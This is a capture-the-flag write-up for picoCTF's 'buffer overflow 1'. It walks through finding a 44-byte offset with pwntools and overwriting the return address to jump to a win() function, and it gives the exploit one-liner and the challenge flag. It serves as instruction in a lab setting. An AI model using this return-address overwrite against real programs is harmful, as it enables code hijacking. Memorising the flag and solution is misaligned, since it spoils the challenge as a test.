# buffer overflow 1
Points: 200

## Category
Binary Exploitation

## Question
>Okay now you're cooking! This time can you overflow the buffer and return to the flag function in this program? You can find it in /problems/buffer-overflow-1_3_af8f83fb19a7e2c98e28e325e4cacf78 on the shell server. Source. 

### Hint
>This time you're actually going to have to control that return address!
>
>Make sure you consider Big Endian vs Little Endian.

## Solution
Before looking at the source code, we can run the program first.

```
$ ./vuln 
Please enter your string: 
AAAA
Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
```

Looks like it takes in an input, and jumps to an address. Let's look at the source code now.

```c
// Imports here...
#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
	char buf[FLAGSIZE];
	FILE *f = fopen("flag.txt","r");
	// Reading flag file
	printf(buf);
}

void vuln(){
	char buf[BUFSIZE];
	gets(buf);

	printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){
	// Unimportant stuff
	puts("Please enter your string: ");
	vuln();
	return 0;
}
```

We can see that the address that it shows us is the return address, which should be the address of _main_. If we do a buffer overflow, we can take control of the return address, and let the program jump to wherever we want.

In this case, we would like to jump to the _win_ function, which prints out the flag.

Let's try spamming the program again to see if our hunch is correct.

```
$ ./vuln 
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Okay, time to return... Fingers Crossed... Jumping to 0x41414141
Segmentation fault
```

The return address has been overwritten to _0x41414141_, which is the hex value of _A_. As long as we can find the correct amount of padding, we can control the where the return pointer returns to.

We can use the [De Bruijn sequence](https://en.wikipedia.org/wiki/De_Bruijn_sequence), which will find the padding we need. We will use _pwntools_.

```python
>>> from pwn import *
>>> cyclic(100)
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
```

We can now feed that string into the program and see what address the program jumps to.

```
$ ./vuln 
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
Segmentation fault
```

Ok, it jumps to _0x6161616c_. We can use `cyclic_find()` to find the offset. First we convert the hex back into ASCII. Remember that this is in little endian format. `p32()` just converts the hex back into ASCII in little endian format.

```python
>>> from pwn import *
>>> cyclic_find(p32(0x6161616c))
44
```

Now we know the amount of padding required. Let's test it again, with 44 'A's, and another 4 'B's. We should expect the address to show _0x41414141_.

```
$ ./vuln 
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Okay, time to return... Fingers Crossed... Jumping to 0x42424242
Segmentation fault
```

Just as we expected. All that's left to do is to replace _BBBB_ with the ASCII values that corresponds to the address of the _win_ function.


```python
>>> from pwn import *
>>> vuln = ELF('./vuln')
[*] '/root/Desktop/picoCTF/Binary Exploitation/buffer overflow 1/solution/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
>>> p32(vuln.symbols['win']) # Get address of win function
'\xcb\x85\x04\x08'
>>> 'A' * 44 + '\xcb\x85\x04\x08'
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xcb\x85\x04\x08'
```

Of course, we cannot type _\xcb\x85\x04\x08_ in ASCII format, so all we have to do is have Python output this string, and pipe it into the program _vuln_.

```
$ python -c "from pwn import *; print 'A' * 44 + '\xcb\x85\x04\x08'" | ./vuln 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
picoCTF{sample_flag}
Segmentation fault
```

Great! It works locally, all we have to do now is run it on the web shell.

```
$ cd /problems/buffer-overflow-1_3_af8f83fb19a7e2c98e28e325e4cacf78
$ python -c "from pwn import *; print 'A' * 44 + '\xcb\x85\x04\x08'" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
picoCTF{addr3ss3s_ar3_3asy65489706}Segmentation fault
```

And we get the flag!

Working solution [solve.py](solution/solve.py)

### Flag
`picoCTF{addr3ss3s_ar3_3asy65489706}`
